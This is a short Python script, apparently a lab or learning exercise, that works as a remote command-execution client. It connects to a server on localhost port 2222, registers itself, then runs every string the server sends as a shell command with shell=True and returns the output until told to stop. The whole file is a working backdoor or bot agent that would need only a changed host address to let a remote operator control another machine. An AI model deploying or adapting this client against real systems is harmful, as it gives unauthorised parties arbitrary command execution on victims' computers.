import socket
import subprocess

SERVER_HOST = "127.0.0.1"
CLIENT_HOST = "127.0.0.1"
PORT = 2222

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # Connect to the server
    s.connect((SERVER_HOST, PORT))

    # Creating and sending a registration request to the server (The request is the client's host).
    registration_request = CLIENT_HOST
    s.sendall(bytes(registration_request, encoding='utf-8'))

    while True:
        message = s.recv(1024).decode('utf-8')
        if message == "stop":
            break
        if message:
            print(f"Execute this: \"{message}\"")
            try:
                result = subprocess.run(message.split(), capture_output=True, text=True, shell=True)
            except:
                s.sendall(bytes("Not a valid command", encoding='utf-8'))
                continue
            s.sendall(bytes(result.stdout.strip(), encoding='utf-8'))
        else:
            print(f"Error with recieving command")

print("Done")